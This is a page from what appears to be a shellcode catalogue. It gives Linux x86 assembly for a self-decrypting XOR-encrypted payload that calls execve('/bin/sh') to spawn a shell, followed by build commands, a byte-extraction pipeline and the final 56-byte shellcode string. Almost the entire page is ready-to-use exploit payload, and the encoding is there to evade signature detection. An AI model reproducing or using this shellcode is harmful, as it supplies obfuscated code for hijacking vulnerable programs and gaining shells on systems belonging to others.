---
layout: default
title: Self-Decrypting XOR Encrypted execve("/bin/sh", NULL, 0) - Spawn shell
permalink: /shellcode/asm-17.html
os: Linux
arch: Intel x86
length: 56
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly
```nasm
section .text
global _start

_start:
    jmp short payload           ; jump to the "payload" label

decrypt:
    pop esi                     ; pop the address of the shellcode into esi
    push 0x45                   ; push the XOR key 0x45
    push 0x17                   ; push the loop counter (length of shellcode)
    pop ecx                     ; pop 0x17 into ecx
    pop ebx                     ; pop 0x45 into ebx

    sub esp, ecx                ; subtract the length of the shellcode from esp

    xor eax, eax                ; null eax

dec_loop:
    dec ecx                     ; decrement ecx by 1
    mov al, byte [esi + ecx]    ; move a byte from esi + ecx into al
    xor al, bl                  ; XOR al against the XOR key in bl
    mov byte [esp + ecx], al    ; move the XOR'ed byte into esp + ecx
    test ecx, ecx               ; check if ecx  is 0
    jne dec_loop                ; if ecx is not 0, continue looping
    jmp esp                     ; if ecx is 0, jump to the decrypted shellcode

payload:
    call decrypt                ; call the decrypt function
    ; define the XOR encrypted shellcode
    db 0x74, 0x9e, 0xb2, 0xa6, 0xcc, 0x84, 0xf5, 0x4e, 0x16, 0x2d, 0x6a, 0x6a, 0x36, 0x2d, 0x2d, 0x6a, 0x27, 0x2c, 0x2b, 0xcc, 0xa6, 0x88, 0xc5
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\xeb\x1a\x5e\x6a\x45\x6a\x17\x59\x5b\x29\xcc\x31\xc0\x49\x8a\x04\x0e\x30\xd8\x88\x04\x0c\x85\xc9\x75\xf3\xff\xe4\xe8\xe1\xff\xff\xff\x74\x9e\xb2\xa6\xcc\x84\xf5\x4e\x16\x2d\x6a\x6a\x36\x2d\x2d\x6a\x27\x2c\x2b\xcc\xa6\x88\xc5
```